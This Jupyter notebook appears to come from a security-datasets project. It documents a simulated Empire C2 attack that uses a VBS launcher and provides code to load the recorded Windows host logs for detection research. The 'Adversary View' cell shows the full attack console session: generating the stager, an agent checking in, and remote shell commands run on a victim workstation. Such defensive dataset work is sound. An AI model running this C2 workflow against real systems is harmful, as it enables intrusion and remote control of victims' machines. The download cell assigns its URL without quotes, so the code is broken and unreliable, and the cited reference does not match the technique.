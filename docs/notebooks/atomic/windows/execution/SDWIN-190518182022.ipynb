{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "d7268ad1",
   "metadata": {},
   "source": [
    "# Empire VBS Execution"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ce013d18",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cfe3cba9",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Contributors      | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2019/05/18 |\n",
    "| Modification Date | 2020/09/20 |\n",
    "| Tactics           | [TA0002](https://attack.mitre.org/tactics/TA0002) |\n",
    "| Techniques        | [T1059.005](https://attack.mitre.org/techniques/T1059/005) |\n",
    "| Tags              | VBS Script Execution |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0816913c",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries executing a VBS script as a launcher for initial access."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3c411434",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "fc4916b7",
   "metadata": {},
   "source": [
    "\n",
    "| Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/execution/host/empire_launcher_vbs.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/execution/host/empire_launcher_vbs.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e21a9bd6",
   "metadata": {},
   "source": [
    "## Simulation Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "91cd5358",
   "metadata": {},
   "source": [
    "### Tools"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0a41ee43",
   "metadata": {},
   "source": [
    "\n",
    "| type | Name | Module |\n",
    "|:-----|:-----|--------|\n",
    "| C2 | Empire | [launcher](https://github.com/BC-SECURITY/Empire/blob/master/lib/stagers/windows/launcher_vbs.py) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8fac47fe",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "(Empire: listeners) > usestager windows/launcher_vbs\n",
    "(Empire: stager/windows/launcher_vbs) > info\n",
    "\n",
    "Name: VBS Launcher\n",
    "\n",
    "Description:\n",
    "  Generates a .vbs launcher for Empire.\n",
    "\n",
    "Options:\n",
    "\n",
    "  Name             Required    Value             Description\n",
    "  ----             --------    -------           -----------\n",
    "  Listener         True                          Listener to generate stager for.\n",
    "  Language         True        powershell        Language of the stager to generate.\n",
    "  StagerRetries    False       0                 Times for the stager to retry\n",
    "                                                connecting.\n",
    "  OutFile          False       /tmp/launcher.vbs File to output .vbs launcher to,\n",
    "                                                otherwise displayed on the screen.\n",
    "  Obfuscate        False       False             Switch. Obfuscate the launcher\n",
    "                                                powershell code, uses the\n",
    "                                                ObfuscateCommand for obfuscation types.\n",
    "                                                For powershell only.\n",
    "  ObfuscateCommand False       Token\\All\\1       The Invoke-Obfuscation command to use.\n",
    "                                                Only used if Obfuscate switch is True.\n",
    "                                                For powershell only.\n",
    "  UserAgent        False       default           User-agent string to use for the staging\n",
    "                                                request (default, none, or other).\n",
    "  Proxy            False       default           Proxy to use for request (default, none,\n",
    "                                                or other).\n",
    "  ProxyCreds       False       default           Proxy credentials\n",
    "                                                ([domain\\]username:password) to use for\n",
    "                                                request (default, none, or other).\n",
    "\n",
    "\n",
    "(Empire: stager/windows/launcher_vbs) > set Listener http\n",
    "(Empire: stager/windows/launcher_vbs) > execute\n",
    "\n",
    "[*] Stager output written out to: /tmp/launcher.vbs\n",
    "\n",
    "(Empire: stager/windows/launcher_vbs) > \n",
    "[*] Sending POWERSHELL stager (stage 1) to 172.18.39.5\n",
    "[*] New agent K47LRAEP checked in\n",
    "[+] Initial agent K47LRAEP from 172.18.39.5 now active (Slack)\n",
    "[*] Sending agent (stage 2) to K47LRAEP at 172.18.39.5\n",
    "\n",
    "(Empire: stager/windows/launcher_vbs) > agents\n",
    "\n",
    "[*] Active agents:\n",
    "\n",
    "Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n",
    "----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n",
    "K47LRAEP ps 172.18.39.5     WORKSTATION5      THESHIRE\\pgustavo       powershell         2316   5/0.0    2020-09-04 20:10:07  http            \n",
    "\n",
    "(Empire: agents) > interact K47LRAEP\n",
    "(Empire: K47LRAEP) > \n",
    "(Empire: K47LRAEP) > shell whoami\n",
    "[*] Tasked K47LRAEP to run TASK_SHELL\n",
    "[*] Agent K47LRAEP tasked with task ID 1\n",
    "(Empire: K47LRAEP) > \n",
    "theshire\\pgustavo\n",
    "..Command execution completed.\n",
    "\n",
    "(Empire: K47LRAEP) > \n",
    "(Empire: K47LRAEP) > \n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0ee63cf1",
   "metadata": {},
   "source": [
    "## Explore Datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "65d21635",
   "metadata": {},
   "source": [
    "### Download & Decompress Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ae7312eb",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from zipfile import ZipFile\n",
    "from io import BytesIO\n",
    "\n",
    "url = https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/execution/host/empire_launcher_vbs.zip\n",
    "zipFileRequest = requests.get(url)\n",
    "zipFile = ZipFile(BytesIO(zipFileRequest.content))\n",
    "datasetJSONPath = zipFile.extract(zipFile.namelist()[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2b32a969",
   "metadata": {},
   "source": [
    "### Read JSON File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a06694f6",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pandas.io import json\n",
    "\n",
    "df = json.read_json(path_or_buf=datasetJSONPath, lines=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f4c6d830",
   "metadata": {},
   "source": [
    "### Access Security Events"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "87aa0b6f",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.groupby(['Channel']).size().sort_values(ascending=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "558b41c3",
   "metadata": {},
   "source": [
    "## References\n",
    "* [https://posts.specterops.io/lateral-movement-scm-and-dll-hijacking-primer-d2f61e8ab992](https://posts.specterops.io/lateral-movement-scm-and-dll-hijacking-primer-d2f61e8ab992) "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
